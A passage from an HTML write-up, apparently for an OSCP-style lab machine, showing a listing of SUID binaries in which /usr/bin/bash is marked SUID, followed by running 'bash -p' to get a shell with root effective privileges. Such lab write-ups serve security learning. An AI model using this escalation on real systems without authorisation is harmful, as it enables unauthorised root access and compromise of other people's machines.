28  2019 /snap/core18/1754/bin/ping&#13;&#10;       80     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1754/bin/su&#13;&#10;       98     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1754/bin/umount&#13;&#10;     1730     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1754/usr/bin/chfn&#13;&#10;     1732     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1754/usr/bin/chsh&#13;&#10;     1783     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1754/usr/bin/gpasswd&#13;&#10;     1847     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1754/usr/bin/newgrp&#13;&#10;     1859     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1754/usr/bin/passwd&#13;&#10;     1950    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1754/usr/bin/sudo&#13;&#10;     2037     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper&#13;&#10;     2345    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1754/usr/lib/openssh/ssh-keysign&#13;&#10;   917970     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper&#13;&#10;   922466    128 -rwsr-xr-x   1 root     root              130152 Jun  5  2020 /usr/lib/snapd/snap-confine&#13;&#10;   918861     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device&#13;&#10;   919076     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1&#13;&#10;   935153    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign&#13;&#10;   918587     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd&#13;&#10;   918308     56 -rwsr-xr-x   1 root     root               55528 Apr  2  2020 /usr/bin/mount&#13;&#10;   918156     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount&#13;&#10;   918588     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd&#13;&#10;   920186     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp&#13;&#10;   917977     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at&#13;&#10;   918578    164 -rwsr-xr-x   1 root     root              166056 Feb  3  2020 /usr/bin/sudo&#13;&#10;   918584     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn&#13;&#10;   <mark>917983   1156 -rwsr-sr-x   1 root     root             1183448 Feb 25  2020 /usr/bin/bash</mark>
+   918376     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec&#13;&#10;   918647     40 -rwsr-xr-x   1 root     root               39144 Apr  2  2020 /usr/bin/umount&#13;&#10;   918585     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh&#13;&#10;   918577     68 -rwsr-xr-x   1 root     root               67816 Apr  2  2020 /usr/bin/su
+    </pre>
+
+    <li>We can gain a root shell by executing bash with the -p flag for persitent permissions.</li>
+
+    <pre>
+bash-5.0$ /usr/bin/bash -p
+bash-5.0# id
+uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
+    </pre>
+
+</body>
+</html>
+
